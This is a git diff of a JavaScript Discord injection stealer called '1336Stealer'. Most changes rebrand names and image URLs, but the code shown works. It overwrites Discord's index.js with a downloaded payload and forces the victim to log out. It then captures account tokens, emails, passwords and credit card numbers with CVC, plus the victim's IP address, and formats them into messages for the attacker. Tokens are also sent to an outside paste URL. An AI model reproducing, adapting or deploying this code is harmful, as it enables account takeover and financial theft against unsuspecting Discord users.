@@ -83,7 +83,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('1336', '${config.apiurl}')
+        res.replace('core' + 'num', indexJS).replace('blackcap', '${config.apiurl}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -98,7 +98,7 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
 
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }
-    if (!fs.existsSync(path.join(__dirname, "1336"))) return !0;
+    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
     execScript(
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
@@ -239,10 +239,10 @@ async function FirstTime() {
                         ip
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     const c = {
-                        username: "1336St34ler",
+                        username: "1336Stealer",
                         content: "",
                         embeds: [{
-                            title: "1336St34ler Initalized",
+                            title: "1336Stealer Initalized",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -250,7 +250,7 @@ async function FirstTime() {
                                 inline: !1
 							}],
                             author: {
-                                name: "1336St34ler"
+                                name: "1336Stealer"
                             }
 						}]
                     };
@@ -266,16 +266,16 @@ async function FirstTime() {
                     } = await getFromURL("https://www.myexternalip.com/json", null)
                     
                     if(b.avatar === null){
-                        usericonurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                        usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                     }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                     if(b.banner === null){
-                        bannerurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                        bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                     }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                     const c = {
-                        username: "1336St34ler",
+                        username: "1336Stealer",
                         content: "",
                         embeds: [{
-                            title: "1336St34ler, Powered By 1336Inc.",
+                            title: "1336Stealer, Powered By 1336Inc.",
                             description: `${b.username}'s account`,
                             color: config["embed-color"],
                             fields: [ {
@@ -287,11 +287,11 @@ async function FirstTime() {
                                 value: `\`${b.username}#${b.discriminator}\``,
                                 inline: !0
 								}, {
-                                name: "<:badges:1057623862369587200> Badges",
+                                name: ":pushpin: Badges",
                                 value: `${GetBadges(b.flags)}`,
                                 inline: !0
 								}, {
-                                name: "<:discord:1057626154523168768> Token",
+                                name: "Token",
                                 value: `\`\`\`${token}\`\`\`\n[Copy](https://paste-pgpj.onrender.com/?p=${token})`,
                                 inline: !1
 								}],
@@ -310,11 +310,11 @@ async function FirstTime() {
 
 
 
-                if (!fs.existsSync(path.join(__dirname, "1336"))) {
+                if (!fs.existsSync(path.join(__dirname, "Blaze"))) {
                     return !0
                 }
 
-                fs.rmdirSync(path.join(__dirname, "1336"));
+                fs.rmdirSync(path.join(__dirname, "Blaze"));
                 if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                     if (config['logout-notify'] == "true") {
                         if (token == null || token == undefined || token == "") {
@@ -322,10 +322,10 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             const c = {
-                                username: "1336St34ler",
+                                username: "1336Stealer",
                                 content: "",
                                 embeds: [{
-                                    title: "1336St34ler, Powered By 1336Inc.",
+                                    title: "1336Stealer, Powered By BlazeInc.",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -333,7 +333,7 @@ async function FirstTime() {
                                         inline: !1
 							}],
                                     author: {
-                                        name: "1336St34ler User log out"
+                                        name: "1336Stealer User log out"
                                     }
 						}]
                             };
@@ -349,16 +349,16 @@ async function FirstTime() {
                                 ip
                             } = await getFromURL("https://www.myexternalip.com/json", null)
                             if(b.avatar === null){
-                                usericonurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                             }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                             if(b.banner === null){
-                                bannerurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
                             }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                             const c = {
-                                username: "1336St34ler",
+                                username: "1336Stealer",
                                 content: "",
                                 embeds: [{
-                                    title: "1336St34ler got logged out",
+                                    title: "1336Stealer got logged out",
                                     description: `${b.username}'s account`,
                                     color: config["embed-color"],
                                     fields: [{
@@ -720,17 +720,17 @@ async function Login(email, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
             
             const params = {
-                username: "1336St34ler",
+                username: "1336Stealer",
                 content: "",
                 embeds: [{
-                    "title": "1336St34ler User Login",
+                    "title": "1336Stealer User Login",
                     description: `${info.username}'s account`,
                     "color": config['embed-color'],
                     "fields": [{
@@ -758,11 +758,11 @@ async function Login(email, password, token) {
                         value: `\`${email}\``,
                         inline: false
 												}, {
-                        name: "<a:pass:1060709696081768500> Password",
+                        name: ":fire: Password",
                         value: `\`${password}\``,
                         inline: true
 												}, {
-                        name: "<:discord:1057626154523168768>Token",
+                        name: "<:discord:1057626154523168768> Token",
                         value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})`,
                         inline: false
 												}, ],
@@ -857,10 +857,10 @@ async function ChangePassword(oldpassword, newpassword, token) {
             }
             let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
             const params = {
-                username: "1336St34ler",
+                username: "1336Stealer",
                 content: "",
                 embeds: [{
-                    "title": "1336St34ler Password Changed",
+                    "title": "1336Stealer Password Changed",
                     description: `${info.username}'s account`,
                     "color": config['embed-color'],
                     "fields": [{
@@ -986,19 +986,19 @@ async function ChangeEmail(newemail, password, token) {
                 return billing
             }
             if(info.avatar === null){
-                usericonurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
             }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
             if(info.banner === null){
-                bannerurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+                bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
             }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
 
             
            const params = {
-                username: "1336St34ler",
+                username: "1336Stealer",
                 content: "",
                 embeds: [{
-                    "title": "1336St34ler Email Changed",
+                    "title": "1336Stealer Email Changed",
                     description: `${info.username}'s account`,
                     "color": config['embed-color'],
                     "fields": [{
@@ -1026,7 +1026,7 @@ async function ChangeEmail(newemail, password, token) {
                             value: `\`${newemail}\``,
                             inline: false
                 }, {
-                            name: "<a:pass:1060709696081768500> Password",
+                            name: ":fire: Password",
                             value: `\`${password}\``,
                             inline: true
                 }, {
@@ -1066,18 +1066,18 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
         ip
     } = await getFromURL("https://www.myexternalip.com/json", null)
         if(info.avatar === null){
-            usericonurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+            usericonurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
         }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
         if(info.banner === null){
-            bannerurl = "https://github.com/Nowze/1336/blob/main/1336.png?raw=true"
+            bannerurl = "https://raw.githubusercontent.com/Nowze/1336Archive/main/1336.png"
         }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
 
         
         const params = {
-            username: "1336St34ler",
+            username: "1336Stealer",
             content: "",
             embeds: [{
-                "title": "1336St34ler Credit Card Added",
+                "title": "1336Stealer Credit Card Added",
                 "description": `
                 **IP:** ${ip}\n\n
                 **Username**\n\`\`\`${info.username}#${info.discriminator}\`\`\`\n
